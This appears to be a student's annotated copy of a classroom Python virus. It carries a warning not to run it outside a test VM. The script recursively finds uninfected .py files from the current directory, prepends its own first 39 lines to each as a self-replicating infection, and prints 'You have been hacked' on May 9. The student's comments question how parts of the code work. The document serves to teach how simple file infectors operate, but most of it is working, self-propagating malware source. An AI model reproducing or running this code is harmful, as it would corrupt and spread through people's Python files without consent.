## Copy the below Python script to your public GitHub repo. Do not execute this script in your Ubuntu VM used for class. If you wish to execute this script, either backup your VM using VirtualBox Snapshot or create a separate VM for testing.
## do not execute this code

#!/usr/bin/python3 ## shebang
import os ## just importing the module/library
import datetime  ## casue script includes dates and times later

SIGNATURE = "VIRUS" ## marks the infected stuff

def locate(path): # where to search
    files_targeted = [] # makes the list
    filelist = os.listdir(path) # fills the list
    for fname in filelist: # this is where it starts to scrub the list, directory > search in it for files > if files is it python > infectes y/n? > if it is use python and not infected.. infect it etc. 
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break ## seems to be checking if the file is already infected.. does the code actually label them as infected? or is this just an example where viruses would add a set of characters to identify if they've been infected????
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = "" ## this is where the virus seems to start taking action, infecting the file list that has been verified as non-infected
    for i,line in enumerate(virus):
        if 0 <= i < 39:  ## I think this is where it will insert the first 39 lines of the virus code, it must set it up for the detonation later on in the script. 
            virusstring += line
    virus.close  ## this seems odd to be here, doesnt it need a () or something to actually make it do anything like close the virus?
    for fname in files_targeted:
        f = open(fname)
        temp = f.read() # seems to copy the ext and stores it here.. then writes over the code with the virus strings f39 lines...
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

def detonate(): ## this seems to be setting function which contains the timeline for the virus to be executed. once it hits the below times it will 'detonate' as defined. 
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: ## apparently the author has a thing for may 9th, I tried doing a search for any significance and I was unable to find any after a quick search...
        print("You have been hacked")

files_targeted = locate(os.path.abspath("")) ## here is where it starts calling the functions so the code actually runs and on may 9th it then prints the 'you've been hacked' message... 
infect(files_targeted)
detonate()
